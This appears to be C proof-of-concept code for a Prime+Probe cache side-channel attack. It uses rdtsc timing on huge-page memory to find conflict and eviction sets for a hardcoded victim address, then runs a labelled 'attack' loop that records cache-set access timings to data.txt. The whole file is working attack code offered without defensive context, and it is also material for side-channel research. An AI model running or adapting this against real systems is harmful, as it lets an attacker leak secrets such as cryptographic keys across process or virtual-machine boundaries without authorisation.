#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <inttypes.h>
#define SET 2048
#define N 320
#define SIZE SET*N
#define THR1 100 
#define THR2 200  
#define CONF -1
#define EVIC -2
#define INIT -100
#define ATTACK 600
#define FLAG 0xfffffffe0000
#define L 96 //way * slice
#define R 3

#define RDTSC(X) asm volatile("rdtsc; shlq $32, %%rdx; orq %%rdx, %%rax":"=r"(X) :: "%rdx")

#define LENGTH (256UL*1024*1024)
#define PROTECTION (PROT_READ | PROT_WRITE)
#ifndef MAP_HUGETLB
#define MAP_HUGETLB 0x40000
#endif
//#define ADDR ((void *)0x0UL)
#define FLAGS (MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB)

struct st{
	char name[16];
	int num;
	int count;
	int flag;
	struct st *next;
	struct st *prev;
	struct st *e_next;
	struct st *e_prev;
}; //sizeof(struct st) is equal to linesize

struct evi{
	int head;
	uintptr_t addr;
};

void loop();
void shuffle(int *array, int set, int n);
void insert(struct st *set, struct st *candidate);
void e_insert(struct st *set, struct st *candidate);
void myremove(struct st *candidate);
int probe(struct st *set, struct st *candidate, int flag);

int main(int argc, char **argv){
	int i, j, k, l, n, w, set, counter;
	int output_num, reader, hit, check;
	int lines[N], array[ATTACK];
	int index[L];
	FILE *fp;
	struct st *p, *tmp, *buf;
	struct evi *evi_buf;
	
	buf = mmap(NULL, LENGTH, PROTECTION, FLAGS, -1, 0);
	evi_buf = (struct evi*)malloc(sizeof(struct st)*L);

	unsigned long long time, t1, t2;

	check = 0;
	set = atoi(argv[1]);
	for(i = 0; i < L; i++) index[i] = INIT;
	//loop start
	for(;;){
		for(i = 0; i < N; i++) lines[i] = i;
		for(i = 0; i < SIZE; i++){
			buf[i].num = i;
			buf[i].count = 0;
		}
		//remove invalid cache lines(if needed)------------------------------------	
		for(j = 0; j < 20; j++){
			struct st *conflict;	

			conflict = (struct st*)malloc(sizeof(struct st));
			conflict->num = CONF;
			conflict->next = conflict->prev = conflict;

			shuffle(lines, j, N);

			for(i = 0; i < N; i++){
				n = lines[i];
				//printf("%d ",n);
				if(!probe(conflict, &buf[n*SET + set], 1)){
					buf[n*SET + set].count++;
					insert(conflict, &buf[n*SET + set]);
				}
			}
			free(conflict);
		}
		//conflict set----------------------------------------------------
		struct st *conflict;
		conflict = (struct st*)malloc(sizeof(struct st));
		conflict->num = CONF;
		conflict->next = conflict->prev = conflict;

		shuffle(lines, counter, N);
		counter = 0;
		for(i = 0; i < N; i++){
			n = lines[i];
			if(buf[n*SET + set].count >= 18) continue;
			//printf("%d ",n);
			if(!probe(conflict, &buf[n*SET + set], 1)){
				insert(conflict, &buf[n*SET + set]);
				buf[n*SET + set].flag = CONF;
				counter++;
			} else {
				buf[n*SET + set].flag = 0;
			}
		}	
		
		fprintf(stderr,"conflict set %d\n",counter);
		
		//eviction set----------------------------------------------------
		hit = 1;
		int number = 0;
		int number_check = 0;
		for(i = 0; i < N; i++){
			n = lines[i];
			if(buf[n*SET + set].count >= 18) continue;
			if(buf[n*SET + set].flag == 0){
				asm("mfence");
				if(probe(conflict, &buf[n*SET + set], 1)){
					struct st *eviction;
					eviction = (struct st*)malloc(sizeof(struct st));
					eviction->num = EVIC;
					eviction->e_next = eviction->e_prev = eviction;

					for(p = conflict->next; p->num != CONF; p = p->next){
						p->prev->next = p->next;
						p->next->prev = p->prev;
						if(!probe(conflict, &buf[n*SET + set], 2)){
							e_insert(eviction, p);
							p->flag = EVIC;
						}
						p->next->prev = p;
						p->prev->next = p;

					}

					number_check++;
					for(p = eviction->e_next; p->num != EVIC; p = p->e_next){
						uintptr_t pnum = (uintptr_t)p;
						pnum &= FLAG;
						if(index[number] != p->num) hit = 0;
						index[number++] = p->num;
					}
						
					for(p = conflict->next; p->num != CONF; p = p->next){
						if(p->flag == EVIC){
							tmp = p->next;
							myremove(p);
							p = tmp->prev;
						}
						
					}
					free(eviction);
				}
			}
		}
		free(conflict);
		if(number == L && hit) break;
	}//loop end
	
	//get other sets' eviction set-------------------------------------------
	uintptr_t addr;
	uintptr_t victim = 0x7efe0cab0010; //target address
	uintptr_t viflag = 0x000000000fc0;
	victim &= viflag;
	
	for(i = 0; i < L; i++){
		evi_buf[i].head = INIT;
		addr = (uintptr_t)&buf[index[i]];
		evi_buf[i].addr = (FLAG & addr);
	}

	for(i = 0; i < 64; i++){
		addr = (uintptr_t)&buf[i];
		addr &= viflag;
		if(addr == victim){
			n = i;
			break;
		}
	}
	for(i = n; i < SIZE; i = i + 64){
		for(j = 0; j < L; j++){
			addr = (uintptr_t)&buf[i];
			addr &= FLAG;
			if(evi_buf[j].head == INIT && addr == evi_buf[j].addr){
				evi_buf[j].head = i;
				break;
			}
		}
	}

	printf("evi_buf[0].head \t%d\n",evi_buf[0].head);
	printf("evi_buf[%d].head \t%d\n",L-1,evi_buf[L-1].head);

	
	//attack-------------------------------------------
	fprintf(stderr,"Please press any key (0: exit)\n");
	scanf("%d",&w);
	if(w == 0){
		exit(0);
	} else {
		fp = fopen("data.txt","w");
	}
	if(fp == NULL){
		fprintf(stderr,"file errror\n");
		exit(1);
	}

	for(i = 0; i < 8; i++){
		for(j = 0; j < SET; j = j + 64){
			for(l = 0; l < (L/8); l++){
				reader = buf[j + evi_buf[(L/8)*i+l].head].num;
			}
			for(k = 0; k < ATTACK; k++){
				loop();
				asm("lfence");
				RDTSC(t1);
				for(l = 0; l < (L/8); l++){
					//Prime & Probe phase
					reader = buf[j + evi_buf[(L/8)*i+l].head].num;
				}
				asm("lfence");
				RDTSC(t2);
				time = t2 - t1;
				array[k] = time;
			}
			for(k = 0; k < ATTACK; k++){
				fprintf(fp,"%d ",array[k]);
			}
			fprintf(fp,"\n");
		}
	}
	fclose(fp);

	fprintf(stderr,"\nend\n");
	return 0;
}

void loop(){
	int i;
	for(i = 0; i < 25000; i++);
}

void shuffle(int *array, int set, int n){
	int i, j, tmp;
	srand(set);
	for(i = 0; i < n; i++){
		j = rand() % N;
		tmp = array[i];
		array[i] = array[j];
		array[j] = tmp;
	}
}


void insert(struct st *set, struct st *candidate){
	candidate->prev = set->prev;
	set->prev->next = candidate;
	candidate->next = set;
	set->prev = candidate;
}

void e_insert(struct st *set, struct st *candidate){
	candidate->e_prev = set->e_prev;
	set->e_prev->e_next = candidate;
	candidate->e_next = set;
	set->e_prev = candidate;
}

void myremove(struct st *candidate){
	candidate->prev->next = candidate->next;
	candidate->next->prev = candidate->prev;
	candidate->next = candidate->prev = candidate;
}

int probe(struct st *set, struct st *candidate, int flag){
	int i, j, tmp, n;
	unsigned long long time, t1, t2;
	struct st *p;

	n = 0;
	for(i = 0; i < 20; i++){
		asm("mfence");
		tmp = candidate->num;
		tmp = candidate->num;
		tmp = candidate->num;
		for(j = 0; j < 10; j++){
			for(p = set->prev; p->num != CONF; p = p->prev){
				tmp = p->num;
				tmp = p->num;
				tmp = p->num;
			}
		}
		asm("lfence");	
		RDTSC(t1);
		tmp = candidate->num;
		asm("lfence");
		RDTSC(t2);
		time = t2 - t1;
		if(flag == 1){
			return (time > THR1);
		} else if(flag == 2){
			if(time > THR1) n++;
		}
	}
	//printf("%d ",n);
	return (n>=flag);
}
